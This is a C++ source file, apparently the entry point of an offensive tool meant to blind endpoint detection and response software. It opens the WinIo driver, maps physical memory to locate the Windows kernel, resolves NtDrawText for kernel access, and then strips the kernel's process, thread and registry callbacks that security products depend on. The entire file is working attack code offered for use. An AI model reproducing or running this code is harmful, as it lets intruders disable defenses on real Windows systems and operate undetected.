#include <iostream>
#include <Windows.h>
#include "util.h"
#include <winternl.h>
#include "blindedr.h"


int main(int argc , char * argv[])
{
    SyscallNumber = GetSyscallNumber();
    std::cout << "[+]syscall " << std::hex << SyscallNumber << std::endl;
    hDeviceHandle = CreateFile(L"\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hDeviceHandle) {
        std::cout << "[-]can't open the device handle\n";
        return false;
    }
    
    for (ULONG64 i = 0x000000000; i < 0x200000000; i += 0x100000) {
        IOCTL_WINIO_MAPSTRUCT * map = Driver::MapPhysicalMemory(hDeviceHandle,0x100000,i);
        //std::cout << "[+]Map Virtual Address:" << std::hex << i << std::endl;
        if (!map->RTN_MAPADDR) {
            return false;
        }
        if (Memory::FindMZ((PVOID)map->RTN_MAPADDR)) {
            NTOSKRNL_PHYSICAL_MEMORY =(ULONG64)map->Address;
            std::cout << "[+]find ntoskrnl in " << std::hex << NTOSKRNL_PHYSICAL_MEMORY << std::endl;
            Driver::UnMapPhysicalMemory(hDeviceHandle, map);
            break;
        }
        else {
            //std::cout << "[+]cant find find ntoskrnl"  <<std::endl;
            Driver::UnMapPhysicalMemory(hDeviceHandle, map);
            continue;
        }

    }

    NtDrawText = Memory::FindVulnFunction(hDeviceHandle, (char*)NtDrawTextMagicPattern, (char*)"NtDrawText");
    MmGetPhysicalAddress = PEFile::GetNTOSFuncAddress((char*)"MmGetPhysicalAddress");
    
    IOCTL_WINIO_MAPSTRUCT * ntosmap = {0};
    ntosmap = Driver::MapPhysicalMemory(hDeviceHandle, 0x10000000, NTOSKRNL_PHYSICAL_MEMORY);

    NTOSKRNL_KERNEL_MEMORY = get_oskrnl_kernel_address();
    ULONG64 Processtype = GetPsProcessAndProcessTypeAddr(hDeviceHandle, 1);
    ULONG64 Processtype1 = GetPsProcessAndProcessTypeAddr(hDeviceHandle, 2);
    RemoveObRegisterCallbacks(hDeviceHandle, Processtype , ntosmap->RTN_MAPADDR);
    RemoveObRegisterCallbacks(hDeviceHandle, Processtype1, ntosmap->RTN_MAPADDR);
    RemoveCMRegisterCallbacks(hDeviceHandle, ntosmap->RTN_MAPADDR);

    //RemoveMiniFilterCallback(hDeviceHandle, ntosmap->RTN_MAPADDR);


}

